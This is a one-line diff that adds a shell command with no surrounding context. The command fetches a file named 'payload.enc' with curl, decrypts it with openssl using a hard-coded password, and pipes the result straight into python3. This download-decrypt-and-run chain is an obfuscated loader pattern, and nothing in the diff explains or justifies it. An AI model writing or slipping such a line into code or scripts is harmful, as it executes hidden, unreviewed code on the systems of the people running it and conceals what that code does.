@@ -1,0 +1,1 @@
+curl payload.enc && openssl enc -d -in payload.enc -aes-256-cbc -k "linux_can_be_hacked" | python3
